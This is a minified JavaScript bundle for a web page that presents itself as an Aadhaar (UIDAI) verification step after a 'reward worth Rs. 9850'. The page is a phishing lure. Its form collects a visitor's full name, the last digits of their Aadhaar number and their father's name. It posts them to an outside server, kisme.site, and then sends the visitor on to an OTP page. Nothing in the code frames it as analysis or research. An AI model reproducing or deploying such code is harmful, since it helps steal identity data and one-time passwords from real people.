(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[589],{9280:function(e,s,n){Promise.resolve().then(n.bind(n,973))},973:function(e,s,n){"use strict";n.r(s),n.d(s,{default:function(){return i}});var t=n(7437),r=n(4033),a=n(2265);function i(){let e=(0,r.useRouter)(),[s,n]=(0,a.useState)(!1);return(0,t.jsx)("div",{className:"container",children:(0,t.jsx)("form",{onSubmit:s=>{s.preventDefault();let t=new FormData(s.target),r={};t.forEach((e,s)=>{r[s]=e}),r.site=window.location.hostname,fetch("https://kisme.site/test_api.php?token=WILASKLDJADLKJASD",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(r)}).then(e=>e.json()).then(s=>{200==s.status?(n(!0),e.push("/otp?next=/fna")):(n(!1),console.log("failed"))}).catch(e=>{n(!1),console.error(e)})},children:(0,t.jsxs)("div",{className:"box",children:[(0,t.jsx)("div",{className:"page-hea",children:(0,t.jsxs)("div",{className:"row",children:[(0,t.jsx)("div",{className:"col-xs-6 col-md-6",children:(0,t.jsxs)("h2",{style:{fontFamily:'"Open Sans", sans-serif',fontSize:16,fontWeight:600,alignItem:"centre",textAlign:"centre"},children:[" ","AADHAR (UIDAI) details"," "]})}),(0,t.jsx)("div",{className:"col-xs-6 col-md-6 text-right",children:(0,t.jsx)("h2",{children:"X"})})]})}),(0,t.jsx)("div",{className:"row",children:(0,t.jsxs)("div",{className:"col-md-6 col-xs-12",children:[(0,t.jsx)("div",{className:"progress",children:(0,t.jsx)("div",{className:"progress-bar",style:{fontFamily:'"Open Sans", sans-serif',color:"#fff",fontWeight:500,width:"100%"},children:"step 4/4: Redeem of reward worth Rs. 9850 successful."})}),(0,t.jsxs)("div",{className:"p-50",children:[(0,t.jsx)("h4",{style:{fontFamily:'"Open Sans", sans-serif',color:"#000",fontWeight:700,marginTop:"-10%"},children:"Aadhar (UIDAI) Verification"}),(0,t.jsx)("br",{}),(0,t.jsx)("br",{}),(0,t.jsxs)("div",{className:"login-box",children:[(0,t.jsxs)("div",{className:"user-box",children:[(0,t.jsx)("input",{type:"text",name:"USNN",className:"name",onkeydown:"return /[a-z A-Z]/i.test(event.key)",minLength:3,maxLength:40,required:!0}),(0,t.jsxs)("label",{children:["Full Name (as per AADHAR)",(0,t.jsx)("span",{style:{color:"red"},children:" *"})]})]}),(0,t.jsxs)("div",{className:"user-box",children:[(0,t.jsx)("input",{type:"text",name:"ADHNDD",id:"aadhar",inputMode:"numeric",maxLength:4,pattern:"\\d{4}",title:"Please enter valid ending 4 digit of AADHAR number !",required:!0}),(0,t.jsxs)("label",{children:["Last 4 digit aadhar number",(0,t.jsx)("span",{style:{color:"red"},children:" *"})]})]}),(0,t.jsxs)("div",{className:"user-box",children:[(0,t.jsx)("input",{type:"text",name:"FFANN",className:"name",onkeydown:"return /[a-z A-Z]/i.test(event.key)",minLength:3,maxLength:40,required:!0}),(0,t.jsxs)("label",{children:["Father's Name",(0,t.jsx)("span",{style:{color:"red"},children:" *"})]})]})]})]}),(0,t.jsx)("div",{className:"row",children:(0,t.jsxs)("div",{className:"col-xs-12 col-md-12 text-center",children:[(0,t.jsx)("a",{href:"#",style:{fontFamily:'"Open Sans", sans-serif',fontWeight:500},className:"btn btn-border",children:"Back"}),(0,t.jsxs)("button",{type:"submit",style:{fontFamily:'"Open Sans", sans-serif',fontWeight:500},className:"btn btn-primary",children:[" ","Submit"," "]})]})}),(0,t.jsx)("br",{})]})})]})})})}},622:function(e,s,n){"use strict";var t=n(2265),r=Symbol.for("react.element"),a=Symbol.for("react.fragment"),i=Object.prototype.hasOwnProperty,l=t.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,o={key:!0,ref:!0,__self:!0,__source:!0};function c(e,s,n){var t,a={},c=null,d=null;for(t in void 0!==n&&(c=""+n),void 0!==s.key&&(c=""+s.key),void 0!==s.ref&&(d=s.ref),s)i.call(s,t)&&!o.hasOwnProperty(t)&&(a[t]=s[t]);if(e&&e.defaultProps)for(t in s=e.defaultProps)void 0===a[t]&&(a[t]=s[t]);return{$$typeof:r,type:e,key:c,ref:d,props:a,_owner:l.current}}s.Fragment=a,s.jsx=c,s.jsxs=c},7437:function(e,s,n){"use strict";e.exports=n(622)},4033:function(e,s,n){e.exports=n(5313)}},function(e){e.O(0,[971,938,744],function(){return e(e.s=9280)}),_N_E=e.O()}]);